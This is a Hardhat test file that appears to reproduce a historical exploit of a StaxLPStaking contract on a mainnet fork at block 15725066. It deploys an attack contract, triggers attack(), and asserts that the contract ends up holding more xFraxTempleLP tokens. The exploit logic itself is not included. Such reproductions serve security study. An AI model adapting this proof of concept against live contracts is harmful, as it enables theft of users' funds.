import { expect } from 'chai'
import { ethers } from 'hardhat'
import { IStaxLPStaking, IERC20, AttackContract } from '../typechain-types'

describe('AttackContract Test', function () {
    let attackContract: AttackContract
    let owner: any
    let StaxLPStaking: IStaxLPStaking
    let xFraxTempleLP: IERC20

    before(async function () {
        ;[owner] = await ethers.getSigners()

        const AttackContract = await ethers.getContractFactory('AttackContract')
        attackContract = await AttackContract.deploy()

        StaxLPStaking = await ethers.getContractAt('IStaxLPStaking', '0xd2869042E12a3506100af1D192b5b04D65137941')
        xFraxTempleLP = await ethers.getContractAt('IERC20', '0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9')
    })

    it('should block number equal to 15725066', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(15725066)
    })

    it('Should perform the attack', async function () {
        const initialBalance = await xFraxTempleLP.balanceOf(attackContract.getAddress())
        console.log('Initial xFraxTempleLP balance:', initialBalance.toString())

        await attackContract.connect(owner).attack()

        const finalBalance = await xFraxTempleLP.balanceOf(attackContract.getAddress())
        console.log('Final xFraxTempleLP balance:', finalBalance.toString())

        expect(finalBalance).to.be.gt(initialBalance)
    })
})
